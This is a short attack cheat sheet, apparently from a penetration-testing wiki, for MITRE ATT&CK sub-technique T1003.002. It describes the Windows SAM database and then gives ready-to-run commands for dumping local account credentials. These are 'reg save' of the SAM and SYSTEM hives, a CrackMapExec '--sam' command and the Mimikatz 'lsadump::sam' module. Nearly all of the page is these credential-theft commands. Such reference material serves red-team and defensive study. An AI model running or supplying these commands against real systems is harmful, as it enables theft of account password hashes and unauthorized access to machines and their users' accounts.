---
description: MITRE ATT&CK, Credential Access, Sub-technique T1003.002
---

# Security Account Manager (SAM)

### Description

The SAM is a database file that contains local accounts for the host, typically those found with the `net user` command.

### Dumping the SAM

#### Manually Extracting&#x20;

```powershell
reg save HKLM\sam sam
reg save HKLM\system system
```

#### CrackMapExec

```bash
crackmapexec smb $ip -u $username -p $password --sam
```

#### Mimikatz

```bash
mimikatz lsadump::sam
```
